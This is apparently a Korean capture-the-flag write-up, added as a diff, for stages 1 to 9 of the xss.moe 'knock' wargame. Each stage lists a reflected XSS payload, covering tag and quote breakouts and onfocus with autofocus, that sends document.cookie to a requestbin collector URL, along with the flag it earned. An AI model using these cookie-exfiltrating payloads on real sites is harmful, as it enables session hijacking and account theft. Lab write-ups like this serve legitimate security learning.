@@ -1,0 +1,241 @@
+xss.knock.moe
+
+stage 1.
+이해:example.com을 나의 웹 사이트로 변경한 후 URL form에 제출하면 cookie값으로 flag를 넘겨주는 거 같다.
+
+나의 웹사이트를 직접적으로 만들어서 하지 않아도 되게 requestbin에서 임시적인 url을 제공해주므로 이 사이트를 이용하여 문제를 해결 시도 함.
+
+requestbin에서 제공해준 URL: http://requestbin.fullcontact.com/1c8pbs91
+
+테스트로 나의 URL에 request를 해보자 아래는 나의 url에게 request를 전송하는 python code
+
+import requests
+
+url = "http://requestbin.fullcontact.com/1c8pbs91/"
+
+params = {
+	"abcd":"aaaa"
+}
+
+res = requests.get(url, params=params)
+
+위 코드처럼 나의 URL에 요청한 후 requestbin에서 제공해준 나의 URL을 다시 접속 또는 브라우저에서 새로고침을 하면
+나의 URL에 대한 어떠한 요청정보가 왔는지(자세히는 파라미터, header 정보 등)를 알 수 있다.
+
+위처럼 문제의 URL FORM에 example.com을 나의 URL로 변경해서 요청하고 나의 requestbin으로 새로고침 또는 접근하면 xss측의 서버가 request를 전송할 때 flag를 전송했기 때문에 문제의 flag를 확인할 수 있다.
+
+payloade
+URL 입력
+
+http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/?location=%22http://requestbin.fullcontact.com/1c8pbs91/?%22%2Bdocument.cookie
+
+http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/?location=%22http://requestbin.fullcontact.com/th6b8kth?%22%2Bdocument.cookiee
+
+FLAG{waiwai_xss}e
+{
+필요한 거 공인아이피 포트포워딩 해놓고, request cookie 값을 받아서 확인
+서버 세팅 (php로 의도된대로 flag가 떨궈진다면 jsp, python으로도 구현)
+APM Apache PHP 
+Apache tomcat JSP
+IIS ASP
+python nginx 
+위의 문제를 해결하면서 서버 세팅에 익숙해지면, docker를 활용한 서버 세팅을 시도 해보자.
+e
+
+
+
+
+
+Stage 2. (script의 페이지 이동 기능 사용)
+문제의 URL에서 사용되는 파라미터 q는 사용자가 입력한 대로 화면에 출력이 된다.
+테스트로 <script>alert(1)</script>을 한 결과 해당 페이지에서 입력한 스크립트가 작동되는 것을 확인할 수 있다.
+
+Stage 1와 같이 requestbin을 이용하여 내가 입력한 URL로 서버가 자신의 cookie 값을 보낸다.
+그리고 그 cookie 값이 flag다.
+
+자바스크립트에서 페이지 이동은 <script>location.href="http://www.abc.com"</script> 같이 하면 해당 스크립트가 동작되는 결과는 www.abc.com으로 페이지 이동이 되는 것이다.
+
+그러므로 페이지 이동 시 쿠키값을 이용한 요청이되도록 다음과 같이 서버에게 자신이 요청할 URL을 입력하면 문제를 해결할 수 있다.
+
+payload:
+<script>location.href="http://www.hackyu.kr/?+document.cookie"</script>
+
+http://1a31198b4289ff3af4f7195a810c48eba9f6bf28.knock.xss.moe/?q=<script>location.href=%22http://requestbin.fullcontact.com/rees95re?%22%2Bdocument.cookie</script>
+
+FLAG{c1a43cdd6c2d3d4a082fe9351bce65f5917ca940}
+
+
+
+
+
+Stage 3.(a태그 벗어나기)
+문제가 기본적으로 a태그의 href가 사용된다.
+
+a태그의 href는 해당 텍스트를 href에 대입된 페이지의 하이퍼링크 역할로 사용되는 것으로 알고 있다.
+나는 html 페이지를 보고 사용자가 무엇을 입력하든 예를들어 abcd를 입력했다고 했을 때 
+<a href="/g=abcd">...</a>
+위와 같이 엉뚱한 페이지로 이동되는 결과밖에 되지 않을 것으로 생각되었다. 
+
+단, 여기서 사용자가 입력한대로 그대로 받아들여주는 것을 이용해서 a태그를 닫고 내가 원하는 입력(스크립트구문)이 동작되며 그뒤는 모두 주석처리가 되도록 시도하였다.
+
+?q="> <script>alert(1)</script><!--
+
+이렇게 되면 스크립트가 적용되며 결과적으로 html에는 다음과 같이 됨을 확인할 수 있다.
+
+<a href="/g="> <script>alert(1)</script><!--"
+
+그 이후 Stage 1, Stage 2와 동일하게 나의 임시 URL로 cookie을 이용한 요청을 하도록 다음과 같이 URL Form에 입력한 후 문제를 해결하였다.
+
+payload:
+"><script>alert(1)</script>
+
+http://68e3b596ebf790e8a781b8d87b84af7eb7b0aeb3.knock.xss.moe/?q="><script>location.href=%22http://requestbin.fullcontact.com/rees95re?%22%2Bdocument.cookie</script><!--
+
+
+FLAG{0041c8c9789deee9280396eb923d5b4ea8e887b2}
+
+
+
+
+
+Stage 4. ("" 벗어나기)
+문제의 파라미터 q에 입력하는 것이 " "사이에 무조건 들어간다.
+이전과 달리 "> 와 같이 입력해도 태그를 자유자재로 조절이 안됨.
+
+'를 입력하면 "/q="   ""사이를 벗어날 수 있다.
+
+'>를 입력하면
+
+<a href="/q=">'> 와 같이 되면 처음으로 나오는 >가 '>에서 입력한 것이다.
+
+즉 '>를 입력하면 >'    즉, ""를 벗어나면서 ' 뒤에 입력한 것이 앞으로 이동되어 입력이 된다.
+
+다음과 같이 파라미터 q에 입력하면 스크립트가 적용되는 것을 확인할 수 있다.
+
+'><script>alert(1)</script>
+
+즉, ?q='><script>alert(1)</script>
+
+payload:
+'><script>alert(1)</script>
+
+http://2375e1f80fe2ec262a235d594fbcee96dba66710.knock.xss.moe/?q='><script>location.href=%22http://requestbin.fullcontact.com/rees95re/?%22%2Bdocument.cookie</script><!--
+
+FLAG{b8ab462f4ee4aa10f1f0eadb16383f1a596f3ec2}
+
+
+
+
+Stage 5. (textarea 벗어나기)
+사용자가 입력한 값이 <textarea> </textarea> 사이에 입력이 되는 것을 확인할 수 있고, textarea 영역을 벗어나서 스크립트를 동작시켜야된다고 생각이 들었다.
+
+가장 간단하게 입력을 </textarea>1 와 같이 입력하였더니, 
+<textarea></textarea>"1" 와 같이 <textarea></textarea> 영역을 벗어났다.
+
+이후 </textarea><script>alert(1)</script>를 입력하여 정상적으로 스크립트가 동작되는 것을 확인하였다.
+
+payload:
+</textarea><script>alert(1)</script>
+
+http://fea7c73bbe92f7880fc15514e076e838d2ce8a90.knock.xss.moe/?q=</textarea><script>location.href=%22http://requestbin.fullcontact.com/rees95re/?%22%2Bdocument.cookie</script>
+
+FLAG{57a968be0c6c0ba1dbc8a222488358366fda4edf}
+
+
+
+
+
+Stage 6. (xmp태그)
+xmp 태그 영역 <xmp> </xmp> 사이에서는 모든지 텍스트로 출력됨
+대표적으로 비슷하면서 반대인 특징을 가진 <pre>태그는 텍스트로 출력되지만 태그의 본 기능도 그대로 사용 및 드러난다.
+
+문제 해결은  </xmp>태크를 닫아주고 그뒤에 스크립트 문장을 주입하여 해결할 수 있다.
+payload:
+</xmp><script>alert(1)</script>
+
+http://d82fe27901fa05dcfa8980262fc811645543e374.knock.xss.moe/?q=</xmp><script>location.href=%22http://requestbin.fullcontact.com/zhjcblzh/?%22%2Bdocument.cookie</script>
+
+FLAG{66cd945a9de10077c24fc13b0834eec04a16df0c}
+
+
+
+Stage 7. (<> tag 클로즈가 안됨, onfocus와 autofocus)
+
+xss"%20type="text"%20onfocus="alert(1)
+
+[alert 테스트]
+http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q="%20onfocus="alert(1)"%20autofocus="
+
+[onfocus의 location.href 테스트]
+ <input type="text" value="" onfocus="location.href='http://www.naver.com'" autofocus=""/>
+
+[테스트 페이지에 직접 location.href 테스트]
+ " onfocus="location.href='http://www.naver.com'" autofocus="
+
+
+autofoucs와 onfocus 
+
+onfocus: 해당 태그가 포커스, 초점이 맞춰지면 정의한 기능을 수행할 수 있는 Attribute
+autofocus : html 페이지가 로드될 때 autofocus가 기재된 태그가 기본적으로 포커스, 초점이 잡힘
+즉, autofocus를 통해서 문제의 input 태그가 포커스가 잡히고, focus Attribute를 통해 정의해놓은 스크립트가 수행되게 하여 문제를 해결할 수 있다.
+
+payload:
+http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q=" onfocus="location.href='http://requestbin.fullcontact.com/1oitcdw1/?'+document.cookie" autofocus="
+
+http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q=" onfocus="location.href=%27http://requestbin.fullcontact.com/1oitcdw1/?%27%2Bdocument.cookie" autofocus="
+
+FLAG{73fd502659f04529e689fa1e4782bc2f5ebbcea0}
+
+스크립트 구문이 되는 부분의 / ?를 제외한 특수문자 URL인코딩 
+ex) 
+" %22
+' %27
++ %2B
+
++는 연결연산자로 사용됨
+
+
+
+
+
+Stage 8. (", <, > html 인코딩 필터 걸림 7번과 동일하지만 '를 사용)
+' onfocus='alert(1)' autofocus='
+[로컬 테스트]
+<input type='text' value='' onfocus=location.href='http://www.example.com' autofocus=''>
+
+[테스트 페이지]
+http://b65797d44372ecb2b2552e32f10ec75f1bddcca6.knock.xss.moe/?q=' onfocus=location.href='http://www.example.com' autofocus='
+
+payload:
+http://b65797d44372ecb2b2552e32f10ec75f1bddcca6.knock.xss.moe/?q=' onfocus=location.href=%27http://requestbin.fullcontact.com/zvmwq5zv/?%27+document.cookie autofocus='
+
+FLAG{7afa4218c3c89a4f47bdfc09aa6ba54f5b411183}
+
+
+
+
+
+Stage 9.(%20, 공백?)
+
+문제의 의도가 공백인것으로 파악되지만 문제 소스보기를 하고 xss를 보면 모든 Attribute의 값을 ', "을 가지지 않는다.
+
+또한 <, > ', "에 대해서 html인코딩을 취하지만 html 인코딩되어있어도 정상적으로 사용이 가능함.
+
+
+[테스트 페이지]
+xss%20onfocus=alert(1)%20autofocus
+
+XSS%20onfocus=location.href=%22http://www.naver.com%22 autofocus
+
+payload:
+http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=xss%20onfocus=location.href=%22http://requestbin.fullcontact.com/1gybu241/?%22%2Bdocument.cookie autofocus
+
+FLAG{491c4c2be4db53cdbf58469e4f18a5e213f59857}
+
+
+
+Stage 10.
+
+
+
+이 이후부터 해당 워게임사이트가 자주 오픈되지가 않아 중단
